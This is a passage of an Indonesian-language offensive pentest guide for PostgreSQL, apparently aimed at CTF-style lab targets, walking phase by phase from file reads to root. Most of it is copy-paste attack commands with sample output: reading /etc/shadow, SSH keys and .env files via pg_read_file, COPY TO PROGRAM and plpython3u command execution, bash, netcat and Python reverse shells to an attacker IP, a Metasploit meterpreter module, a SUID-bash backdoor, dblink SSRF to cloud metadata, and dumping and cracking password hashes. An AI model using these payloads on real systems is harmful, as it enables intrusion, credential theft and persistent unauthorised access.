-- Query 9: Cek apakah ada SECURITY DEFINER functions (potential privesc)
SELECT proname, prosecdef, proowner::regrole
FROM pg_proc
WHERE prosecdef = true AND pronamespace = 2200;  -- schema public

-- Query 10: Uptime server (info tambahan)
SELECT pg_postmaster_start_time();
```

---

## ═══════════════════════════════════════

## FASE 4: FILE READ via pg_read_file()

## ═══════════════════════════════════════

> **Prasyarat:** SUPERUSER atau anggota role `pg_read_server_files`

### Langkah 4.1 — Test pg_read_file()

SQL

```
-- Test dasar: apakah bisa baca file?
SELECT pg_read_file('/etc/passwd');
```

**OUTPUT BERHASIL ✅:**

text

```
 pg_read_file
--------------
 root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
developer:x:1000:1000::/home/developer:/bin/bash
```

➡️ **Berhasil! Catat username** (untuk SSH, lateral movement):

Bash

```
# Simpan ke file di Parrot OS
PGPASSWORD="$DB_PASS" psql -h $TARGET -U $DB_USER -d $DB_NAME \
    -t -c "SELECT pg_read_file('/etc/passwd');" \
    > ~/pgsql_loot/files/target_passwd.txt

# Extract usernames dengan shell login
grep -v "nologin\|false\|sync" ~/pgsql_loot/files/target_passwd.txt | cut -d: -f1
```

---

### Langkah 4.2 — Baca File Sensitif Kritis

SQL

```
-- SSH Private Key (TARGET UTAMA!)
SELECT pg_read_file('/var/lib/postgresql/.ssh/id_rsa');
SELECT pg_read_file('/home/developer/.ssh/id_rsa');
SELECT pg_read_file('/root/.ssh/id_rsa');

-- Konfigurasi PostgreSQL (untuk analisis lebih lanjut)
SELECT pg_read_file('/etc/postgresql/14/main/pg_hba.conf');
SELECT pg_read_file('/etc/postgresql/14/main/postgresql.conf');

-- File konfigurasi web aplikasi (cari credentials lebih banyak)
SELECT pg_read_file('/var/www/html/settings.py');     -- Django
SELECT pg_read_file('/var/www/app/config/database.yml'); -- Rails
SELECT pg_read_file('/var/www/html/.env');              -- Laravel/Node
SELECT pg_read_file('/opt/app/config/default.json');    -- Node.js

-- Shadow file (butuh run sebagai root — jarang berhasil)
SELECT pg_read_file('/etc/shadow');

-- Info sistem
SELECT pg_read_file('/proc/version');
SELECT pg_read_file('/etc/os-release');
```

**OUTPUT BERHASIL ✅ — SSH Private Key ditemukan:**

text

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3vOCPG1Hj9pFTfA8gMdvN2CVQ...
...
-----END RSA PRIVATE KEY-----
```

➡️ **SIMPAN DAN GUNAKAN:**

Bash

```
# Simpan key
PGPASSWORD="$DB_PASS" psql -h $TARGET -U $DB_USER -d $DB_NAME \
    -t -c "SELECT pg_read_file('/var/lib/postgresql/.ssh/id_rsa');" \
    | sed 's/^ *//' \
    > ~/pgsql_loot/files/id_rsa

chmod 600 ~/pgsql_loot/files/id_rsa

# Test SSH (coba username dari /etc/passwd)
ssh -i ~/pgsql_loot/files/id_rsa postgres@$TARGET
ssh -i ~/pgsql_loot/files/id_rsa developer@$TARGET
ssh -i ~/pgsql_loot/files/id_rsa root@$TARGET

# Jika ada passphrase → crack
ssh2john ~/pgsql_loot/files/id_rsa > ~/pgsql_loot/hashes/ssh_key.hash
john ~/pgsql_loot/hashes/ssh_key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Langkah 4.3 — List Direktori dengan pg_ls_dir()

SQL

```
-- List isi direktori untuk navigasi
SELECT pg_ls_dir('/home');
SELECT pg_ls_dir('/var/www');
SELECT pg_ls_dir('/opt');
SELECT pg_ls_dir('/var/lib/postgresql');
```

**OUTPUT BERHASIL ✅:**

text

```
 pg_ls_dir
-----------
 developer
 admin
```

➡️ Ada user `developer` dan `admin`. Coba baca SSH key mereka:

SQL

```
SELECT pg_read_file('/home/developer/.ssh/id_rsa');
SELECT pg_read_file('/home/developer/.bash_history');  -- sering ada password
SELECT pg_ls_dir('/home/developer');
```

**OUTPUT GAGAL ❌ — permission denied for function pg_read_file:**

text

```
ERROR:  permission denied for function pg_read_file
```

➡️ Bukan superuser dan bukan member `pg_read_server_files`. Cek:

SQL

```
-- Cek apakah bisa eskalasi via role membership
\du
-- Cek SECURITY DEFINER functions
SELECT proname FROM pg_proc WHERE prosecdef = true;
```

➡️ Jika tidak ada path eskalasi → Fokus ke dump data tabel dan Fase 5 (RCE)

---

## ═══════════════════════════════════════

## FASE 5: RCE via COPY TO/FROM PROGRAM

## ═══════════════════════════════════════

> **Prasyarat:** SUPERUSER = true (`usesuper = t`)  
> **Ini adalah xp_cmdshell-nya PostgreSQL — sangat powerful!**

### Langkah 5.1 — Test Command Execution Dasar

SQL

```
-- Method 1: COPY TO PROGRAM (output ke file)
COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned.txt';

-- Baca hasilnya
SELECT pg_read_file('/tmp/pwned.txt');
```

**OUTPUT BERHASIL ✅:**

text

```
 pg_read_file
----------------------------------------------------
 uid=106(postgres) gid=113(postgres) groups=113(postgres)
```

➡️ **RCE berhasil!** Berjalan sebagai user `postgres`.

SQL

```
-- Method 2: COPY FROM PROGRAM (output langsung ke tabel — lebih fleksibel)
-- Sangat berguna jika tidak bisa baca file via pg_read_file

CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'id; whoami; uname -a; ip a';
SELECT * FROM cmd_output;
DROP TABLE cmd_output;
```

**OUTPUT BERHASIL ✅:**

text

```
                         output
---------------------------------------------------------
 uid=106(postgres) gid=113(postgres) groups=113(postgres)
 postgres
 Linux target 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1
 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>...
```

**OUTPUT GAGAL ❌ — must be superuser:**

text

```
ERROR:  must be superuser to COPY to or from an external program
```

➡️ Tidak punya SUPERUSER. Cek `pg_execute_server_program` role:

SQL

```
\du
-- Jika tidak punya → Skip ke Fase 6 (Extension Abuse) atau Fase 7 (Dump Data)
```

---

### Langkah 5.2 — Spawn Reverse Shell

Bash

```
# Di Parrot OS — Setup listener DULU:
nc -lvnp $LPORT
```

SQL

```
-- Di prompt psql — Method 1: Bash reverse shell (paling reliable)
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"';
```

**OUTPUT BERHASIL ✅ — Shell diterima di Parrot OS:**

text

```
Listening on 0.0.0.0 4444
Connection received on 10.10.11.200 47832
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
postgres@target:~$ id
uid=106(postgres) gid=113(postgres) groups=113(postgres)
postgres@target:~$
```

➡️ **SHELL sebagai postgres!**

Bash

```
# Stabilize shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

➡️ **Langkah selanjutnya:**

1. Cek sudo: `sudo -l`
2. Jika ada `sudo /bin/bash` atau `sudo ALL` → `sudo bash` → ROOT!
3. Jika tidak → Lanjut ke **<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>**

**OUTPUT GAGAL ❌ — Bash reverse shell tidak connect:**

text

```
-- (tidak ada koneksi di listener)
```

➡️ Outbound firewall memblokir bash. Coba alternatif:

SQL

```
-- Method 2: nc mkfifo
COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f';

-- Method 3: Python reverse shell
COPY (SELECT '') TO PROGRAM 'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"';

-- Method 4: Jika tidak ada outbound shell, buat SUID bash (lebih persistent)
COPY (SELECT '') TO PROGRAM 'chmod u+s /bin/bash';
-- Lalu di shell target (setelah dapat akses lain):
-- /bin/bash -p
-- whoami → root!
```

**OUTPUT GAGAL ❌ — COPY TO PROGRAM hang tanpa output:**  
➡️ Command mungkin berjalan tapi tidak ada output. Verifikasi via file:

SQL

```
COPY (SELECT '') TO PROGRAM 'whoami > /tmp/test.txt';
SELECT pg_read_file('/tmp/test.txt');
-- Jika keluar 'postgres' → command berjalan, hanya reverse shell yang blocked
```

---

### Langkah 5.3 — Metasploit Automated RCE (CVE-2019-9193)

Bash

```
# Jika tidak mau manual, Metasploit otomatis:
msfconsole -q -x "
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec;
set RHOSTS $TARGET;
set RPORT 5432;
set USERNAME $DB_USER;
set PASSWORD $DB_PASS;
set DATABASE $DB_NAME;
set LHOST $LHOST;
set LPORT $LPORT;
set PAYLOAD linux/x64/meterpreter/reverse_tcp;
exploit
"
```

**OUTPUT BERHASIL ✅ — Meterpreter session:**

text

```
[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.11.200:5432 - Exploiting...
[+] 10.10.11.200:5432 - Got meterpreter session!
meterpreter > getuid
Server username: postgres
```

---

## ═══════════════════════════════════════

## FASE 6: EXTENSION ABUSE

## ═══════════════════════════════════════

> **Masuk sini jika bukan SUPERUSER atau ingin alternatif RCE**

### Langkah 6A — dblink: SSRF & Internal Port Scanning

SQL

```
-- Aktifkan dblink jika belum ada
CREATE EXTENSION IF NOT EXISTS dblink;

-- Scan port internal (metode: coba connect, timeout = port closed)
-- Port 22 (SSH)
SELECT dblink_connect('ssh_test', 'host=127.0.0.1 port=22 connect_timeout=3');

-- Port 80 (HTTP)
SELECT dblink_connect('http_test', 'host=127.0.0.1 port=80 connect_timeout=3');

-- Cloud Metadata SSRF (AWS EC2)
SELECT * FROM dblink(
    'host=169.254.169.254 user=postgres dbname=postgres connect_timeout=3',
    'SELECT 1'
) AS t1(res int);
```

**OUTPUT BERHASIL ✅ — Port terbuka:**

text

```
 dblink_connect
----------------
 OK
```

➡️ Port terbuka! Dokumentasikan untuk pivot.

**OUTPUT GAGAL ❌ — Connection refused:**

text

```
ERROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
```

➡️ Port tertutup di internal server.

**OUTPUT BERHASIL ✅ — SSRF ke AWS metadata:**

text

```
ERROR:  could not establish connection
DETAIL:  FATAL:  database "postgres" does not exist
```

➡️ Endpoint 169.254.169.254 accessible! Ini cloud environment. Lanjut ke **[🚀 Bagian 0: Konteks & Lab Setup](/docs/aws-pentest)**

---

### Langkah 6B — plpython3u: Python RCE (Jika Tersedia)

SQL

```
-- Cek apakah plpython3u tersedia
SELECT * FROM pg_extension WHERE extname = 'plpython3u';

-- Aktifkan jika superuser (butuh superuser untuk create extension)
CREATE EXTENSION IF NOT EXISTS plpython3u;

-- Buat fungsi RCE via Python
CREATE OR REPLACE FUNCTION exec_cmd(command text)
RETURNS text AS $$
    import subprocess
    return subprocess.getoutput(command)
$$ LANGUAGE plpython3u;

-- Eksekusi command
SELECT exec_cmd('id');
SELECT exec_cmd('whoami');
SELECT exec_cmd('cat /etc/passwd');
```

**OUTPUT BERHASIL ✅:**

text

```
                    exec_cmd
---------------------------------------------
 uid=106(postgres) gid=113(postgres) groups=113(postgres)
```

➡️ **RCE via Python!** Spawn reverse shell:

SQL

```
-- Spawn reverse shell via Python
SELECT exec_cmd('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])"');
```

---

## ═══════════════════════════════════════

## FASE 7: HASH EXTRACTION & CRACKING

## ═══════════════════════════════════════

> **Tujuan:** Dump hash password PostgreSQL dan crack untuk credential reuse

### Langkah 7.1 — Dump pg_shadow

SQL

```
-- Dump hashes semua user (butuh superuser)
SELECT usename, passwd FROM pg_shadow;
```

**OUTPUT BERHASIL ✅:**

text

```
  usename   │                        passwd
────────────┼────────────────────────────────────────────────
 postgres   │ md53175bce1d3201d16594cebf9d7eb3f9d
 app_user   │ md5b4b147bc522828731f1a016bfa72c073
 developer  │ SCRAM-SHA-256$4096:salt123$:verylongbase64hash...
```

**Cara identifikasi format hash:**

|Prefix|Format|Hashcat Mode|Cara Crack|
|---|---|---|---|
|`md5` + 32 hex|MD5 PostgreSQL|`-m 10`|`md5(password+username)`|
|`SCRAM-SHA-256$...`|SCRAM-SHA-256|Tidak bisa di-crack langsung|Harus capture challenge-response|

---

### Langkah 7.2 — Crack MD5 Hash PostgreSQL

Bash

```
# Format di pg_shadow: md5<32hex>
# Contoh: md53175bce1d3201d16594cebf9d7eb3f9d (user: postgres)

# Langkah 1: Buang prefix 'md5', tambahkan :<username> sebagai salt
echo "3175bce1d3201d16594cebf9d7eb3f9d:postgres" > ~/pgsql_loot/hashes/pgsql_md5.hash

# Langkah 2: Crack dengan Hashcat mode 10 (md5(pass+salt))
hashcat -m 10 ~/pgsql_loot/hashes/pgsql_md5.hash \
    /usr/share/wordlists/rockyou.txt \
    -o ~/pgsql_loot/hashes/cracked_pgsql.txt

# Langkah 3: Lihat hasil
cat ~/pgsql_loot/hashes/cracked_pgsql.txt
```

**OUTPUT BERHASIL ✅:**

text

```
3175bce1d3201d16594cebf9d7eb3f9d:postgres:postgres
```

➡️ Password `postgres` untuk user `postgres`!

**OUTPUT GAGAL ❌ — Tidak bisa crack:**

text

```
Session..........: hashcat
Status...........: Exhausted
```

➡️ Coba rules:

Bash

```
hashcat -m 10 ~/pgsql_loot/hashes/pgsql_md5.hash \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Atau wordlist lebih besar
hashcat -m 10 ~/pgsql_loot/hashes/pgsql_md5.hash \
    /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

---

## ═══════════════════════════════════════

## FASE 8: DATABASE LOOTING

## ═══════════════════════════════════════

> **Tujuan:** Dump semua data sensitif dari database aplikasi

### Langkah 8.1 — Identifikasi dan Dump Tabel Sensitif

SQL

```
-- Cari tabel dengan nama sensitif di SEMUA database
-- Pertama, list semua database:
SELECT datname FROM pg_database WHERE datname NOT IN ('template0', 'template1');

-- Pindah ke setiap database dan cari:
\c myapp_db

SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- Dump tabel yang berpotensi sensitif:
SELECT * FROM users LIMIT 20;
SELECT * FROM accounts LIMIT 20;
SELECT * FROM admins LIMIT 20;
SELECT * FROM credentials LIMIT 20;
SELECT * FROM passwords LIMIT 20;

-- Cari kolom yang mengandung kata kunci sensitif di semua tabel:
SELECT table_name, column_name
FROM information_schema.columns
WHERE column_name ILIKE '%password%'
   OR column_name ILIKE '%passwd%'
   OR column_name ILIKE '%secret%'
   OR column_name ILIKE '%token%'
   OR column_name ILIKE '%hash%';
```

**OUTPUT BERHASIL ✅:**

text

```
 username │             password             │     email
──────────┼──────────────────────────────────┼────────────────────
 admin    │ $2b$12$LQv3c1yqBWVHxkd0LHAkCO... │ admin@company.com
 user1    │ $2b$12$DqE.77RkYxW9J3vPqmH3ce... │ user1@company.com
```

➡️ Hash bcrypt! Crack:

Bash

```
# bcrypt → hashcat mode 3200 (LAMBAT tapi worth it)
echo '$2b$12$LQv3c1yqBWVHxkd0LHAkCO...' > ~/pgsql_loot/hashes/bcrypt_admin.hash
hashcat -m 3200 ~/pgsql_loot/hashes/bcrypt_admin.hash \
    /usr/share/wordlists/rockyou.txt \
    -o ~/pgsql_loot/hashes/cracked_bcrypt.txt
```

---

## ═══════════════════════════════════════

## FASE 9: POST-EXPLOITATION & LATERAL MOVEMENT

## ═══════════════════════════════════════

### Langkah 9.1 — Setelah Dapat Shell sebagai postgres

Bash

```
# Di shell postgres:

# 1. Cek sudo
sudo -l

# Jika output: (ALL) NOPASSWD: ALL → INSTANT ROOT!
# sudo bash

# Jika output: (root) NOPASSWD: /bin/bash
# sudo /bin/bash

# 2. Cek SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 3. Cari credentials di filesystem
find /home /opt /var/www -name "*.py" -o -name ".env" -o -name "*.yml" 2>/dev/null \
    | xargs grep -iE "password|secret|key" 2>/dev/null | head -30

# 4. Cek network (target pivot berikutnya)
ss -tunlp
ip route
arp -n
cat /etc/hosts

# 5. Lanjut privesc
# → ke <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

**OUTPUT BERHASIL ✅ — sudo -l menampilkan ALL:**

text

```
User postgres may run the following commands on target:
    (ALL) NOPASSWD: ALL
```

➡️ **INSTANT ROOT!**

Bash

```
sudo bash
# atau:
sudo -u root /bin/bash
whoami  # → root
```

### Langkah 9.2 — Backdoor via SUID Bash (Dari psql, Tanpa Shell)

SQL

```
-- Jika ingin persistent access tanpa reverse shell:
COPY (SELECT '') TO PROGRAM 'chmod u+s /bin/bash';
```

Bash

```
# Di shell target (dari akses lain, misal SSH sebagai low-priv user):
/bin/bash -p
whoami  # → root!
cat /root/root.txt
```

---

### Langkah 9.3 — Cross-Service Credential Testing Chart

text

```
PostgreSQL Credentials / Hashes Found
            │
            ├─ ─→ Port 22   (SSH)       → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
            ├──→ Port 21   (FTP)       → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
            ├──→ Port 80   (HTTP)      → Login panel, try creds
            ├──→ Port 443  (HTTPS)     → Login panel, try creds
            ├──→ Port 445  (SMB)       → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
            ├──→ Port 3306 (MySQL)     → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
            ├──→ Port 1433 (MSSQL)     → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
            ├──→ Port 5985 (WinRM)     → evil-winrm
            └──→ AD Environment        → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
```

Bash

```
# Test semua service dengan credentials PostgreSQL yang sudah didapat:
nxc ssh $TARGET -u "$DB_USER" -p "$DB_PASS"
nxc smb $TARGET -u "$DB_USER" -p "$DB_PASS"
nxc ftp $TARGET -u "$DB_USER" -p "$DB_PASS"
ssh "$DB_USER@$TARGET"
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`FATAL: role "postgres" does not exist`|Username diubah|Brute username: `pgsql-brute`, cek config web|
|`FATAL: password authentication failed`|Password salah|Credential reuse, brute force hydra|
|`FATAL: no pg_hba.conf entry for host`|IP tidak di whitelist|SSH tunnel: `ssh -L 55432:127.0.0.1:5432`|
|`psql: Connection refused`|Listen localhost saja|SSH tunnel|
|`FATAL: SSL off` (no pg_hba entry)|Butuh SSL|`sslmode=require` di connection string|
|`ERROR: must be superuser to COPY`|Bukan superuser|Cek plpython3u, dump data saja, atau privesc dulu|
|`ERROR: permission denied for pg_read_file`|Bukan superuser/pg_read_server_files|Cek role membership `\du`|
|`psql Hang tidak ada respon`|GSSAPI atau MTU|`PGGSSENCMODE=disable psql ...`|
|`ERROR: extension "dblink" not available`|postgresql-contrib tidak terinstall|Gunakan COPY TO PROGRAM|
|`FATAL: Peer authentication failed`|User Linux tidak cocok|`sudo -u postgres psql`|
|`ERROR: syntax error COPY ... PROGRAM`|PostgreSQL < 9.3|Versi lama, tidak support COPY PROGRAM|
|Reverse shell tidak connect|Outbound firewall|Coba nc mkfifo, atau `chmod u+s /bin/bash`|
|Hashcat mode 10 tidak crack|Password kuat atau SCRAM format|SCRAM tidak bisa di-crack offline|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Port 5432 Open
│
├─ FASE 0: Fingerprint + Trust Auth Test
│   ├─ psql -w → [TRUST AUTH!] → LANGSUNG FASE 3!
│   └─ Versi PostgreSQL → Catat untuk CVE search
│
├─ FASE 1: Credential Discovery
│   ├─ settings.py / .env / database.yml → [Creds?] → FASE 2
│   ├─ Common passwords (postgres:postgres) → [Valid?] → FASE 2
│   └─ Brute force hydra → [Crack?] → FASE 2
│
├─ FASE 2: Login PostgreSQL
│   ├─ [Berhasil] → FASE 3
│   └─ [Gagal] → SSH Tunnel / SSL / cek pg_hba.conf
│
├─ FASE 3: Reconnaissance (10 Query Wajib)
│   ├─ usesuper = t → FASE 5 (COPY TO PROGRAM RCE)
│   ├─ usesuper = f → Cek pg_read_server_files / pg_execute_server_program
│   ├─ dblink tersedia → FASE 6A (SSRF/Port Scan)
│   └─ plpython3u tersedia → FASE 6B (Python RCE)
│
├─ FASE 4: File Read (jika punya akses)
│   ├─ /etc/passwd → Username list untuk SSH/SMB
│   ├─ id_rsa → SSH langsung
│   └─ settings.py/.env → Lebih credentials
│
├─ FASE 5: COPY TO/FROM PROGRAM (RCE)
│   ├─ Reverse shell → Shell sebagai postgres
│   ├─ chmod u+s /bin/bash → Persistent root access
│   └─ Shell postgres → sudo -l → [ALL?] → ROOT!
│
├─ FASE 6: Extension Abuse
│   ├─ dblink → SSRF / internal port scan / cloud metadata
│   └─ plpython3u → Python RCE → Shell
│
└─ FASE 7-9: Hash Extraction + Lateral Movement
    └─ MD5 hash crack → creds → reuse ke SSH/SMB/WinRM
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="4444"
export DB_USER="postgres"; export DB_PASS="postgres"; export DB_NAME="postgres"
mkdir -p ~/pgsql_loot/{files,creds,hashes,shells}

# === TRUST AUTH CHECK (paling cepat) ===
psql -h $TARGET -U postgres -d postgres -w -c "SELECT 1;" 2>/dev/null && echo "TRUST AUTH!"

# === DETEKSI ===
nmap -sV -sC -p 5432 $TARGET
nmap -p 5432 --script pgsql-brute --script-args "userdb=users.txt,passdb=passwords.txt" $TARGET

# === KONEKSI ===
psql -h $TARGET -U $DB_USER -d $DB_NAME                          # Interaktif
PGPASSWORD="$DB_PASS" psql -h $TARGET -U $DB_USER -d $DB_NAME    # Dengan env var
psql -h $TARGET -U postgres -d postgres -w                        # Trust (no pass)
PGGSSENCMODE=disable psql -h $TARGET -U $DB_USER -d $DB_NAME     # Fix hang/GSSAPI
# SSH Tunnel:
ssh -L 55432:127.0.0.1:5432 user@$TARGET -N -f && psql -h 127.0.0.1 -p 55432 -U postgres

# === RECON META-COMMANDS (di dalam psql>) ===
# \l          → List databases
# \c dbname   → Connect to database
# \dt         → List tables
# \du         → List roles
# \q          → Quit

# === RECON QUERIES ===
# SELECT version();
# SELECT current_user;
# SELECT usesuper FROM pg_user WHERE usename = current_user;   -- t=superuser!
# SELECT datname FROM pg_database;
# SELECT rolname, rolsuper FROM pg_roles;
# SELECT usename, passwd FROM pg_shadow;   -- Hash extraction

# === FILE READ ===
# SELECT pg_read_file('/etc/passwd');
# SELECT pg_read_file('/home/user/.ssh/id_rsa');
# SELECT pg_read_file('/var/www/html/.env');
# SELECT pg_ls_dir('/home');

# === RCE (COPY TO/FROM PROGRAM) ===
# COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
# SELECT pg_read_file('/tmp/out.txt');
# COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"';
# CREATE TABLE cmd(t text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd; DROP TABLE cmd;
# COPY (SELECT '') TO PROGRAM 'chmod u+s /bin/bash';   -- Persistent SUID

# === HASH CRACKING ===
# MD5 format: md5<32hex> → strip 'md5' → add :username
echo "3175bce1d3201d16594cebf9d7eb3f9d:postgres" > pgsql.hash
hashcat -m 10 pgsql.hash /usr/share/wordlists/rockyou.txt    # MD5 pgsql
hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt # bcrypt

# === BRUTE FORCE ===
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgresql://$TARGET -t 4 -V

# === METASPLOIT CVE-2019-9193 ===
# use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
# set RHOSTS TARGET; set USERNAME postgres; set PASSWORD postgres; exploit
```

---

> **➡️ NEXT:** Setelah PostgreSQL selesai:
> 
> - **[📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS](/docs/redis-and-mongodb)** — Jika ada port 6379 (Redis) atau 27017 (MongoDB)
> - **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)** — Jika dapat shell postgres dan perlu escalate ke root
> - **[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)** — Jika dapat SSH key dari pg_read_file()
> - **[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration)** — Jika environment Active Directory